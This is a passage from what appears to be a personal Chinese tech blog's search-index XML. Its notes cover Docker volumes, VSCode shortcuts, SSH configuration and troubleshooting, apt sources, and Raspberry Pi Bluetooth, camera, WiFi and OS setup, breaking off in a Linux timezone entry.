很多时候，这两项表象差不多，不同的场景使用不同的配置。不需要本地持久化的目录可以使用<code>VOLUME</code>，可以在多个容器间可以共享。</p><ol><li>没有指定VOLUME也没有指定-v，这种是普通文件夹。</li><li>指定了VOLUME没有指定-v，这种文件夹可以在不同容器之间共享，但是无法在本地修改。</li><li>指定了-v的文件夹，这种文件夹可以在不同容器之间共享，且可以在本地修改。</li></ol></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://segmentfault.com/q/1010000004107293">【1】</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscode-keymap.md</title>
      <link href="/post/vscode-keymap.html"/>
      <url>/post/vscode-keymap.html</url>
      
        <content type="html"><![CDATA[<p>cmd + b 打开关闭左侧边栏<br>cmd + j 打开下面面板<br>shift + alt + f 格式化代码    </p><p>shift + cmd + k 删除一行    </p><p>cmd + right 光标到最右<br>cmd + left 光标最左    </p><p>shift + cmd + left 选中光标以左<br>shift + cmd + right 选中光标以右<br>shift + cmd + c 启动命令行 </p><p>cmd + down 光标到最后<br>cmd + up 光标到开始<br>cmd + right 光标到最右<br>cmd + left 光标到最左<br>shift + cmd + up 选中光标处到开始<br>shift + cmd + down 选中光标处到结束<br>shift + cmd + alt + down 向下选着多行（多行编辑）<br>shift + cmd + alt + left&#x2F;right 多行编辑    </p><p>alt + left 向左跳过一个单词<br>alt + right 向右跳过一个单词    </p><p>cmd + del 删除光标左边左右单词<br>ctrl + k 删除光标右边所有单词 (cmd + fn + del)    </p><p>delete 删除左边一个字母<br>fn + delete 删除右边一个字母    </p><p>cmd + i 向下选着一行<br>cmd + g 下一个查找得到的单词    </p><p>ctrl + g 跳转到行    </p><p>shift + cmd + l 所有选中单词高亮    </p><p>ctrl + o 光标处断行插入<br>shift + cmd + enter 上面插入一行<br>cmd + enter 下面插入一行    </p><p>cmd + z 撤销<br>cmd + shift + z 恢复    </p><p>shift + alt + a 多行注释 （cmd + &#x2F;）    </p><p>cmd + [ 左移<br>cmd + ] 右移<br>cmd + \ 切分窗口    </p><p>shift + cmd + v 预览    </p><p>cmd + k o 新窗口打开当前文件<br>cmd + k m 切换语言模式<br>cmd + k p 复制当前文件路径<br>cmd + k r 在文件管理器中打开当前文件<br>cmd + k v 预览<br>cmd + k left 当前窗口左移<br>cmd + k right 当前窗口右移<br>cmd + k w 关闭当前文件 (cmd + w)    </p><p>cmd + p 快速打开文件(cmd + e)<br>ctrl + tal 快速打开文件并按tab切换文件    </p><p>alt + up 移动当前行向上<br>alt + down 移动当前行向下    </p><p>shift + cmd + [ 折叠代码<br>shift + cmd + ] 打开代码    </p><p>alt + cmd + o 导入Go package    </p><p>ctrl + - 后退</p><p>shift + cmd + space 函数参数提示</p><p>alt + ⬆ 上移一行</p><p>shift + alt + ⬆ 复制当前行到上面</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SSH</title>
      <link href="/post/SSH.html"/>
      <url>/post/SSH.html</url>
      
        <content type="html"><![CDATA[<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ol><li>SSH登录时指定私钥</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh username@ip -i ./xxx/privateKey -p prot</span><br></pre></td></tr></table></figure><ol start="2"><li>SSH代理</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -N -L -f 0.0.0.0:3306:127.0.0.1:3306 user@host </span><br></pre></td></tr></table></figure><ul><li>-N 只发送数据不连接</li><li>-L 映射  localhost:localport:remotehost:remoteport 代理主机</li><li>-f 后台运行</li></ul><p>经过本机<code>3306</code>端口的流量都经<code>user@host</code>机器转发到<code>127.0.0.1:3306</code>上去</p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>在.ssh文件夹下新建<code>config</code>文件，示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Host www</span><br><span class="line">    HostName 192.168.1.111</span><br><span class="line">    Port 50</span><br><span class="line">    User root</span><br><span class="line">    IdentityFile ~/.ssh/id_rsa_2048</span><br><span class="line"></span><br><span class="line"># git指定私钥</span><br><span class="line">Host api</span><br><span class="line">    HostName api.domain.com</span><br><span class="line">    User git</span><br><span class="line">    Port 22</span><br><span class="line">    IdentityFile ~/.ssh/git_id_rsa</span><br></pre></td></tr></table></figure><p>访问的时候只需运行<code>ssh www</code>就能访问<code>192.168.1.111</code>服务器了</p><h3 id="SSH配置"><a href="#SSH配置" class="headerlink" title="SSH配置"></a>SSH配置</h3><p>&#x2F;etc&#x2F;ssh&#x2F;sshd_config</p><ol><li><p>禁止密码登录</p><p> vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PasswordAuthentication no </span><br></pre></td></tr></table></figure><p> 修改后重新加载配置</p></li><li><p>避免自动断开</p><p> vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 60s 一次心跳</span><br><span class="line">ClientAliveInterval 60</span><br><span class="line"># 5 次失败后自动段考</span><br><span class="line">ClientAliveCountMax 5 </span><br></pre></td></tr></table></figure><p> 修改后重新加载配置</p></li></ol><h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><ol><li><p>已经在<code>authorized_keys</code>加入过publicKey，但是还是要求输入密码。</p><blockquote><p>权限问题，一般.ssh目录的文件权限为<code>600</code>。</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 authorized_keys</span><br><span class="line">restorecon -r -vv /root/.ssh</span><br></pre></td></tr></table></figure></blockquote></li><li><p><code>ssh-copy-id</code> 命令<br> <code>ssh-copy-id</code>命令可以把本地主机的公钥复制到远程主机的 authorized_keys 文件上，ssh-copy-id 命令也会给远程主机的用户主目录（home）和 <del>&#x2F;.ssh, 和</del>&#x2F;.ssh&#x2F;authorized_keys设置合适的权限。</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-copy-id user@server</span><br><span class="line">ssh-copy-id -i ~/.ssh/id_rsa.pub user@server</span><br></pre></td></tr></table></figure></li><li><p><code>sshpass</code> 输入密码<br> ssh 登录时不能指定密码，有时间很不方便。使用 sshpass 可以来处理这个问题。</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sshpass -p &#x27;passwd&#x27; ssh user@domain</span><br></pre></td></tr></table></figure></li><li><p>连接自动断开<br> 修改<code>/etc/ssh/sshd_config</code> <code>ClientAliveInterval</code>和<code>ClientAliveInterval</code>参数</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 指定了服务器端向客户端请求消息的时间间隔。默认是0，不发送，而ClientAliveInterval 60表示每分钟发送一次。</span><br><span class="line">ClientAliveInterval 60</span><br><span class="line"># ClientAliveCountMax表示服务器发出请求后客户端没有响应的次数达到一定值, 就自动断开。</span><br><span class="line">ClientAliveCountMax 3</span><br></pre></td></tr></table></figure></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://segmentfault.com/q/1010000000445726">CentOS SSH公钥登录问题</a></li><li><a href="http://serverfault.com/questions/321534/public-key-authentication-fails-only-when-sshd-is-daemon">public key authentication fails ONLY when sshd is daemon</a></li><li><a href="https://web.archive.org/web/20170801031147/http://www.cnblogs.com/qcly/archive/2013/07/27/3219535.html">一次由SELinux引起的ssh公钥认证失败问题</a> </li><li><a href="http://www.2cto.com/os/201212/173257.html">ssh免密码登录(公钥登录)失败的原因</a> </li><li><a href="http://blog.csdn.net/wangjunjun2008/article/details/19993395">Linux命令之非交互SSH密码验证-sshpass</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ssh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚拟机网络</title>
      <link href="/post/virtual-machine-network.html"/>
      <url>/post/virtual-machine-network.html</url>
      
        <content type="html"><![CDATA[<ol><li><p>bridged(桥接模式)<br>什么是桥接方式连接，我打个比喻，桥接就相当于兄弟一样是并列的，也就是说使用桥接时，虚拟机的IP网段和主机的网段是一样的。</p></li><li><p>NAT(网络地址转换模式)<br>NAT（网络地址转换） NAT是network address translate的简称，什么是NAT方式连接，NAT就相当于父子关系一样，也就是说使用NAT时，本地主机就相当于虚拟机的网关。</p></li><li><p>host-only(主机模式)<br>Host-only 主机和虚拟机之间的网络互访, 但虚拟机访问不了internet。</p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>apt</title>
      <link href="/post/apt.html"/>
      <url>/post/apt.html</url>
      
        <content type="html"><![CDATA[<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><ul><li>apt-get</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">參數：</span><br><span class="line">-q ：不要在螢幕上輸出訊息，常用在背景環境的執行當中喔！</span><br><span class="line">-y ：自動在進行 apt-get 時回答 y 的回應；</span><br><span class="line">-c ：後面接的是設定檔，一般系統會主動的以 /etc/apt 內的設定檔為依據。</span><br><span class="line">[更新項目]：要 apt-get 進行的工作，主要有這幾項：</span><br><span class="line">   update      ：就是更新伺服器與用戶端的套件表頭清單，這個動作務必要進行！</span><br><span class="line">   install     ：後面需要加上要安裝的套件名稱才行！</span><br><span class="line">   upgrade     ：進行『已安裝套件』的完整升級，不過未安裝套件則不予安裝；</span><br><span class="line">   dist-upgrade：以 upgrade 相似，但是當新版本的套件有其他相依屬性的套件加入時，</span><br><span class="line">                 單純的 upgrade 將無法進行安裝，此時就得要使用 dist-upgrade 了！</span><br><span class="line">   clean       ：清除已經下載到 /var/cache/apt/archives/ 的套件檔案。</span><br><span class="line">   remove      ：移除某個套件啊！</span><br></pre></td></tr></table></figure><p><em>那個 update 的參數並不是在進行更新， 而是在進行伺服器與用戶端的套件表頭清單更新而已， 但這個動作相當重要，如果你沒有作這個動作的話，你的套件就不會更新了！ 在 apt-get update 後，再使用 apt-get dist-upgrade 這樣就能夠將整個系統給他升級了！</em></p><ul><li>apt-cache</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">參數：</span><br><span class="line">[搜尋項目]：apt-cache 可以搜尋 apt 所列出的套件標頭資料喔！可用項目有：</span><br><span class="line">pkgnames：列出本系統上面的所有套件名稱！！有點類似 (rpm -qa)；</span><br><span class="line">dump    ：列出所有的套件標頭以及其相關的相依屬性套件！</span><br><span class="line">search  ：後面可接要搜尋的字串，例如 apt-cache search postfix</span><br><span class="line">show    ：後面接套件名稱，可以顯示出該套件的主要內容的描述！</span><br><span class="line">showpkg ：列出後面所接套件的相依屬性以該其套件提供的相關功能！</span><br><span class="line">depends ：可以列出與後面所接套件有相依屬性或者是衝突的相關資料！</span><br></pre></td></tr></table></figure><h3 id="源配置"><a href="#源配置" class="headerlink" title="源配置"></a>源配置</h3><p>文件&#x2F;etc&#x2F;apt&#x2F;sources.list是一个普通可编辑的文本文件，保存了ubuntu软件更新的源服务器的地址。和sources.list功能一样的是&#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;*.list(<em>代表一个文件名，只能由字母、数字、下划线、英文句号组成)。sources.list.d目录下的</em>.list文件为在单独文件中写入源的地址提供了一种方式，通常用来安装第三方的软件。  </p><p>每一行的开头是deb或者deb-src，分别表示直接通过.deb文件进行安装和通过源文件的方式进行安装。<br>deb或者deb-src字段之后，是一段URL，之后是五个用空格隔开的字符串，分别对应相应的目录结构。在浏览器中输入 <a href="http://archive.ubuntu.com/ubuntu/">http://archive.ubuntu.com/ubuntu/</a> ，并进入dists目录，可以发现有5个目录和前述sources.list文件中的第三列字段相对应。任选其中一个目录进入，可以看到和sources.list后四列相对应的目录结构。</p><p>树莓派apt源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ stretch main contrib non-free rpi</span><br></pre></td></tr></table></figure><h3 id="国内的apt源"><a href="#国内的apt源" class="headerlink" title="国内的apt源"></a>国内的apt源</h3><ol><li><a href="http://mirrors.aliyun.com/">阿里</a></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://linux.vbird.org/linux_server/0210network-secure/0220upgrade.php#apt_config">【1】</a><a href="http://www.tuicool.com/articles/EjMJNz/">【2】</a><a href="http://outofmemory.cn/code-snippet/35699/raspberry-pi-apt-get-source-list">【3】</a><a href="http://shumeipai.nxez.com/2013/08/31/raspbian-chinese-software-source.html">【4】</a><a href="https://www.raspbian.org/RaspbianMirrors">【5】</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> apt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树莓派蓝牙</title>
      <link href="/post/raspberry-pi-bluetooth.html"/>
      <url>/post/raspberry-pi-bluetooth.html</url>
      
        <content type="html"><![CDATA[<h3 id="Linux中蓝牙管理"><a href="#Linux中蓝牙管理" class="headerlink" title="Linux中蓝牙管理"></a>Linux中蓝牙管理</h3><p>蓝牙管理工具<code>bluetoothctl</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">list               显示机器上的蓝牙设备</span><br><span class="line">show [ctrl]        显示机器上蓝牙状态信息</span><br><span class="line">select &lt;ctrl&gt;      选着一个蓝牙设备</span><br><span class="line">devices            列出所有的蓝牙设备</span><br><span class="line">paired-devices     列出一配对的设备</span><br><span class="line">power &lt;on/off&gt;     打开蓝牙</span><br><span class="line">pairable &lt;on/off&gt;  设置设备是否可以配对</span><br><span class="line">discoverable &lt;on/off&gt;  设置是否可见</span><br><span class="line">agent &lt;on/off/capability&gt;  Enable/disable agent with given capability</span><br><span class="line">default-agent  Set agent as the default one</span><br><span class="line">scan &lt;on/off&gt;     扫描设备</span><br><span class="line">info &lt;dev&gt;        设备信息</span><br><span class="line">pair &lt;dev&gt;        配对</span><br><span class="line">trust &lt;dev&gt;       信任设备</span><br><span class="line">untrust &lt;dev&gt;     Untrust device</span><br><span class="line">block &lt;dev&gt;       拉黑设备</span><br><span class="line">unblock &lt;dev&gt;     Unblock device</span><br><span class="line">remove &lt;dev&gt;      删除一个设备</span><br><span class="line">connect &lt;dev&gt;     连接设备</span><br><span class="line">disconnect &lt;dev&gt;  断开</span><br><span class="line">version           Display version</span><br><span class="line">quit              Quit program</span><br></pre></td></tr></table></figure><p><code>service bluetooth status</code>查看蓝牙服务状态</p><p>问题：</p><ol><li>connect 报错<br><img src="/./images/bluetooth-connect.png"></li></ol><p>补充：<br>bluetoothctrl connect 报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[bluetooth]# connect 22:22:04:EE:32:B0</span><br><span class="line">Attempting to connect to 22:22:04:EE:32:B0</span><br><span class="line">Failed to connect: org.bluez.Error.Failed</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install pulseaudio pulseaudio-module-bluetooth pavucontrol</span><br><span class="line">pulseaudio --start</span><br></pre></td></tr></table></figure><p>参考<a href="https://wiki.archlinux.org/index.php/Bluetooth_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">【1】</a> <a href="http://unix.stackexchange.com/questions/258074/error-when-trying-to-connect-to-bluetooth-speaker-org-bluez-error-failed">【2】</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> RaspberryPi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树莓派摄像头挂载</title>
      <link href="/post/raspberry-pi-camera.html"/>
      <url>/post/raspberry-pi-camera.html</url>
      
        <content type="html"><![CDATA[<h3 id="树莓派摄像头挂载"><a href="#树莓派摄像头挂载" class="headerlink" title="树莓派摄像头挂载"></a>树莓派摄像头挂载</h3><h4 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h4><p>使用raspistill命令能拍照，但是调用opencv打开摄像头方法却失败。找不到&#x2F;dev&#x2F;video0设备。</p><h4 id="处理办法"><a href="#处理办法" class="headerlink" title="处理办法"></a>处理办法</h4><p><code>sudo modprobe bcm2835-v4l2 gst_v4l2src_is_broken=1</code></p><p>要想永久生效，需要修改<code>/etc/modules-load.d/modules.conf </code>，在下面追加<br><code>bcm2835-v4l2</code></p><p>参考：<a href="http://blog.csdn.net/machh/article/details/51385130">【1】</a> <a href="http://stackoverflow.com/questions/25941171/how-to-get-gstreamer1-0-working-with-v4l2-raspicam-driver">【2】</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> RaspberryPi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树莓派设置WIFI</title>
      <link href="/post/raspberry-pi-wifi.html"/>
      <url>/post/raspberry-pi-wifi.html</url>
      
        <content type="html"><![CDATA[<h3 id="启动设置WIFI"><a href="#启动设置WIFI" class="headerlink" title="启动设置WIFI"></a>启动设置WIFI</h3><p>新建 <code>wpa_supplicant.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev</span><br><span class="line">network=&#123;</span><br><span class="line">    ssid=&quot;路由名称&quot;</span><br><span class="line">    psk=&quot;密码&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重启电脑</p><h3 id="扫描WiFi"><a href="#扫描WiFi" class="headerlink" title="扫描WiFi"></a>扫描WiFi</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo iwlist wlan0 scan | grep ESSID</span><br></pre></td></tr></table></figure><h3 id="设置静态IP"><a href="#设置静态IP" class="headerlink" title="设置静态IP"></a>设置静态IP</h3><p>编辑&#x2F;etc&#x2F;network&#x2F;interfaces<br><code>sudo vi /etc/network/interfaces</code></p><p>找到<code>allow-hotplug wlan0</code>一栏<br>修改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iface wlan0 inet static</span><br><span class="line">    address 192.168.0.118</span><br><span class="line">    gateway 192.168.0.1</span><br><span class="line">    netmask 255.255.255.0 </span><br></pre></td></tr></table></figure><p>注意，如果<code>/etc/network/interfaces</code>有如下提示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Please note that this file is written to be used with dhcpcd</span><br><span class="line"># For static IP, consult /etc/dhcpcd.conf and &#x27;man dhcpcd.conf&#x27;</span><br></pre></td></tr></table></figure><p>需要在<code>/etc/dhcpcd.conf</code>配置静态IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">interface eth0</span><br><span class="line">static ip_address=192.168.1.4/24 # /24表示掩码为 255.255.255.0</span><br><span class="line">static routers=192.168.1.1</span><br><span class="line">static domain_name_servers=114.114.114.114 114.114.115.115</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> RaspberryPi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>树莓派安装操作系统</title>
      <link href="/post/raspberry-pi-os.html"/>
      <url>/post/raspberry-pi-os.html</url>
      
        <content type="html"><![CDATA[<h2 id="树莓派安装操作系统"><a href="#树莓派安装操作系统" class="headerlink" title="树莓派安装操作系统"></a>树莓派安装操作系统</h2><h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><ol><li><p><a href="https://www.raspberrypi.org/downloads/raspbian/">下载</a>系统镜像</p></li><li><p>如果是<code>.zip</code>文件解压镜像</p></li><li><p>格式化SD卡</p><p> 必须是<code>FAT32</code>格式</p></li><li><p><code>diskutil list</code> 找到SD卡</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/dev/disk0 (internal):</span><br><span class="line">#:                       TYPE NAME                    SIZE       IDENTIFIER</span><br><span class="line">0:      GUID_partition_scheme                         500.3 GB   disk0</span><br><span class="line">1:                        EFI EFI                     314.6 MB   disk0s1</span><br><span class="line">2:                 Apple_APFS Container disk1         500.0 GB   disk0s2</span><br><span class="line"></span><br><span class="line">/dev/disk1 (synthesized):</span><br><span class="line">#:                       TYPE NAME                    SIZE       IDENTIFIER</span><br><span class="line">0:      APFS Container Scheme -                      +500.0 GB   disk1</span><br><span class="line">                            Physical Store disk0s2</span><br><span class="line">1:                APFS Volume Macintosh HD            171.9 GB   disk1s1</span><br><span class="line">2:                APFS Volume Preboot                 39.8 MB    disk1s2</span><br><span class="line">3:                APFS Volume Recovery                519.0 MB   disk1s3</span><br><span class="line">4:                APFS Volume VM                      4.3 GB     disk1s4</span><br><span class="line"></span><br><span class="line">/dev/disk2 (external, physical):</span><br><span class="line">#:                       TYPE NAME                    SIZE       IDENTIFIER</span><br><span class="line">0:     FDisk_partition_scheme                        *32.0 GB    disk2</span><br><span class="line">1:             Windows_FAT_32 boot                    66.1 MB    disk2s1</span><br><span class="line">2:                      Linux                         31.9 GB    disk2s2</span><br></pre></td></tr></table></figure></li><li><p>卸载设备</p><blockquote><p>此处的<code>/dev/disk2</code>为上条命令查到的SD卡</p></blockquote> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diskutil unmountDisk /dev/disk2</span><br></pre></td></tr></table></figure></li><li><p>将镜像写入SD卡</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dd bs=1m if=2016-05-27-raspbian-jessie.img of=/dev/rdisk2</span><br></pre></td></tr></table></figure></li></ol><h3 id="登录系统"><a href="#登录系统" class="headerlink" title="登录系统"></a>登录系统</h3><ol><li><p>使用网线链接到路由器</p></li><li><p>登录路由器管理界面查看树莓派IP</p><p> 或者使用nmap扫描端口 </p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p22 10.0.1.3/24</span><br></pre></td></tr></table></figure><blockquote><p>10.0.1.3 为你本机IP</p></blockquote></li><li><p>SSH登录到树莓派</p><blockquote><p>默认用户名为<code>pi</code>，密码为<code>raspberry</code>。<br>注意：新版<code>raspberrypi</code>操作系统<code>SSH</code>服务并没有开机启动！！！此时需要在在磁盘目录新建一个名为<code>ssh</code>的文件。</p></blockquote> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh pi@host</span><br></pre></td></tr></table></figure> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh pi@raspberrypi.local</span><br></pre></td></tr></table></figure></li><li><p>修改默认密码</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd pi</span><br></pre></td></tr></table></figure></li><li><p>启用root用户</p><ol><li><p>设置root用户密码</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure></li><li><p>解锁root用户</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd --unlock root</span><br></pre></td></tr></table></figure></li><li><p>允许root SSH登录</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><p> 找到<code>PermitRootLogin</code>一行修改为<code>PermitRootLogin yes</code></p></li></ol></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://www.raspberrypi.org/documentation/installation/installing-images/mac.md">INSTALLING OPERATING SYSTEM IMAGES ON MAC OS</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> RaspberryPi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux时区</title>
      <link href="/post/linux-timezone.html"/>
      <url>/post/linux-timezone.html</url>
      
        <content type="html"><![CDATA[<h2 id="Linux修改时区"><a href="#Linux修改时区" class="headerlink" title="Linux修改时区"></a>Linux修改时区</h2><blockquote><p>date -R 查看当前系统时区</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/timezone</span><br></pre></td></tr></table></figure><p><code>tzselect</code> 选择时区，选着完成不会生效。需要在<code>.profile</code>中加入<code>TZ=&#39;Asia/Shanghai&#39;; export TZ</code>后生效。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tzselect</span></span><br><span class="line">Please identify a location so that time zone rules can be set correctly.</span><br><span class="line">Please select a continent, ocean, &quot;coord&quot;, or &quot;TZ&quot;.</span><br><span class="line"> 1) Africa</span><br><span class="line"> 2) Americas</span><br><span class="line"> 3) Antarctica</span><br><span class="line"> 4) Arctic Ocean</span><br><span class="line"> 5) Asia</span><br><span class="line"> 6) Atlantic Ocean</span><br><span class="line"> 7) Australia</span><br><span class="line"> 8) Europe</span><br><span class="line"> 9) Indian Ocean</span><br><span class="line">10) Pacific Ocean</span><br><span class="line">11) coord - I want to use geographical coordinates.</span><br><span class="line">12) TZ - I want to specify the time zone using the Posix TZ format.</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">5</span></span><br><span 